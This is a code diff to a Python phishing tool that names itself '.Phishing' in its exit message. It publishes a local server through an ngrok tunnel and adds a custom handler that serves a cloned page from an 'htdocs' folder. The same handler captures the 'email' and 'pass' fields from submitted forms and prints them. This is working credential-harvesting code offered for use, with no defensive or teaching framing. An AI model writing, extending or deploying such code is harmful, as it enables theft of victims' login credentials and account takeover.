@@ -4,6 +4,9 @@ import webbrowser
 from pyngrok import ngrok
 import subprocess
 import sys
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from http import HTTPStatus
+import urllib.parse
 
 
 options = {
@@ -12,6 +15,52 @@ options = {
     # Add other options here for 03 to 20
 }
 
+class FormRequestHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == "/":
+            # Serve the root page (index.html)
+            self.send_response(HTTPStatus.OK)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            with open(os.path.join(".", "htdocs/index.html"), 'rb') as file:
+                self.wfile.write(file.read())
+        elif self.path.startswith("/htdocs"):
+            # Serve the website content for files in the htdocs directory
+            try:
+                with open(os.path.join(".", self.path[1:]), 'rb') as file:
+                    if self.path.endswith(".woff"):
+                        self.send_response(HTTPStatus.OK)
+                        self.send_header('Content-type', 'font/woff')
+                    else:
+                        self.send_response(HTTPStatus.OK)
+                        self.send_header('Content-type', 'application/octet-stream')
+                    self.end_headers()
+                    self.wfile.write(file.read())
+            except FileNotFoundError:
+                self.send_response(HTTPStatus.NOT_FOUND)
+                self.end_headers()
+        else:
+            self.send_response(HTTPStatus.NOT_IMPLEMENTED)
+            self.end_headers()
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        form_data = self.rfile.read(content_length).decode('utf-8')
+        form_data = urllib.parse.parse_qs(form_data)
+
+        # Extract email and password from the form data
+        email = form_data.get('email', [''])[0]
+        password = form_data.get('pass', [''])[0]
+
+        print("Email:", email)
+        print("Password:", password)
+
+        self.send_response(HTTPStatus.OK)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+
+        response_content = "<h1>Form Submitted Successfully!</h1>"
+        self.wfile.write(response_content.encode('utf-8'))
+
 def clear_screen():
     if os.name == 'nt':  # Windows
         os.system('cls')
@@ -19,12 +68,18 @@ def clear_screen():
         os.system('clear')
 
 def run_http_server(directory, python_executable):
-    command = [python_executable, "-m", "http.server", "8080", "--directory", directory]
-    subprocess.run(command, start_new_session=True)
+    # Using FormRequestHandler as the handler for the server
+    handler_class = FormRequestHandler
+    server_address = ("", 8080)
+
+    try:
+        httpd = HTTPServer(server_address, handler_class)
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        httpd.server_close()
 
 def find_python_executable():
     try:
-        # Try to find the Python executable using 'which' (on Unix/Linux) or 'where' (on Windows)
         result = subprocess.run(["which", "python3"] if sys.platform != "win32" else ["where", "python"], capture_output=True, text=True, check=True)
         return result.stdout.strip()
     except subprocess.CalledProcessError:
@@ -93,7 +148,6 @@ def main():
         print("Ngrok is not installed on your computer. Please install ngrok and try again.")
         return
 
-    # Find the Python executable
     python_executable = find_python_executable()
     if not python_executable:
         print("Python executable not found. Please make sure Python 3 is installed and accessible from the terminal.")
@@ -128,8 +182,8 @@ def main():
 
             try:
                 # Get the public URL from the NgrokTunnel object
-                ngrok_url = public_url.public_url.replace("http", "https")
-                local_url = f"http://localhost:8080/{filename}"
+                ngrok_url = public_url.public_url
+                local_url = f"http://localhost:80/{filename}"
 
                 print(f"Local URL: {local_url}")
                 print(f"Ngrok URL: {ngrok_url}")
@@ -151,5 +205,4 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         print("\nExiting .Phishing.")
     finally:
-        # Terminate ngrok when the script exits
         ngrok.kill()
